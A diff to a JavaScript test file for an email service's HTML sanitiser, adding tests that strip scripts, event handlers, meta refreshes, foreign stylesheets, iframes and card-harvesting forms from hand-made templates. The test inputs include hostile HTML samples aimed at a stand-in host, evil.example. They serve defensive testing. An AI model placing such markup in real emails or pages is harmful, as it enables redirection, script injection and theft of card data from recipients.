@@ -6,7 +6,7 @@
  *   - a row's content, a caller's own text when the row is missing (written
  *     as a whole document or not), a request with no template at all; only a
  *     row that is a whole document of its own (a Super Admin's hand-made
- *     design, or an old row) goes as it is;
+ *     design, or an old row) goes as it is, without what no mail may carry;
  *   - the brand is read when the mail is sent: the logo from the one
  *     brand-asset resolver, the name in the template's language, the legal
  *     line, the app's address;
@@ -86,7 +86,7 @@ vi.mock('../../../server/services/platformRegion.js', async (importOriginal) => 
   getPlatformAllowedLocales: async () => db.locales,
 }));
 
-const { sendEmail, sendPlatformEmail, renderEmailForPreview, templateContentProblems } = await import('../../../server/services/email/index.js');
+const { sendEmail, sendPlatformEmail, renderEmailForPreview, refusedContentProblems, templateContentProblems } = await import('../../../server/services/email/index.js');
 const { issueVerificationEmail } = await import('../../../server/services/auth-email.js');
 const { mailTextLines, sendOfflineNoticeTest } = await import('../../../server/services/widget/offlineNotice.js');
 const { renderOtpEmail: renderVerificationOtp } = await import('../../../server/services/verification/templates.js');
@@ -241,8 +241,19 @@ describe('a content is checked when it is sent', () => {
     expect(await check(RECEIPT.html_body)).toEqual([]);
     expect(await check('<p><a href="https://respok.app/pricing">Plans</a> <a href="mailto:support@respok.app">Write</a></p>')).toEqual([]);
     expect(await check('<p><a href="https://evil.example">x</a></p><iframe></iframe>')).toEqual(['foreign_link', 'forbidden_element:iframe']);
-    // A whole document of its own is checked by its body.
-    expect(await check('<!doctype html><html><head><meta charset="utf-8"></head><body><p>ok</p></body></html>')).toEqual([]);
+    // A whole document of its own is checked whole: its body as content
+    // (its preheader hidden by design), its head for what may not go out.
+    expect(await check('<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"></head><body><div class="preheader" style="display:none">Soon</div><p>ok</p></body></html>')).toEqual([]);
+    expect(await check('<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example"><script>x()</script></head><body onload="x()"><p>ok</p></body></html>'))
+      .toEqual(['forbidden_element:meta', 'forbidden_element:script', 'event_handler']);
+  });
+
+  it('Super Admin may not save what would run or load anything once opened, or hide from its reader; the rest is advice', () => {
+    expect(refusedContentProblems([
+      'foreign_link', 'forbidden_element:form', 'event_handler', 'script_link', 'foreign_image', 'background_url',
+      'hidden_element', 'too_many_images', 'image_without_size_or_alt', 'bad_link', 'too_large',
+    ])).toEqual(['forbidden_element:form', 'event_handler', 'script_link', 'foreign_image', 'background_url', 'hidden_element']);
+    expect(refusedContentProblems(['foreign_link', 'too_large'])).toEqual([]);
   });
 });
 
@@ -252,6 +263,24 @@ describe('a row that is a whole document of its own goes as it is', () => {
     await receipt({ footer: { html: '<p>F</p>', text: 'F' } });
     expect(sent().html).toBe('<!doctype html><html><body><p>Own design R-7001</p><p>F</p></body></html>');
     expect(sent().text).toBe('Own design R-7001\n\nF');
+  });
+
+  it('but for what no mail may carry, head and body alike; the lines a document\'s head needs stay', async () => {
+    db.templates[0].html_body = '<!DOCTYPE html>\n<html lang="tr"><head><meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">'
+      + '<meta http-equiv="refresh" content="0;url=https://evil.example"><title>İptal</title><script>steal()</script><link rel="stylesheet" href="https://evil.example/a.css"></head>'
+      + '<body style="margin:0"><p onclick="steal()">Own {receipt_number}</p><form action="https://evil.example/f"><p>inside</p><input name="card"></form>'
+      + '<iframe src="https://evil.example"></iframe></body></html>';
+    await receipt({});
+    expect(sent().html).toBe('<!DOCTYPE html>\n<html lang="tr"><head><meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">'
+      + '<title>İptal</title></head><body style="margin:0"><p>Own R-7001</p><p>inside</p></body></html>');
+  });
+
+  it('a row is a whole document only when it begins as one: a `<html` further in is content, and wears the layout', async () => {
+    db.templates[0].html_body = '<h1>Hi</h1><p title="see <html >">x</p><form action="https://evil.example/f"><p>inside</p></form>';
+    await receipt({});
+    expect(sent().html).toMatch(/^<!DOCTYPE html>\n<html lang="en" dir="ltr"/);
+    expect(sent().html).not.toMatch(/<form|evil\.example/);
+    expect(sent().html).toContain('inside');
   });
 });
 
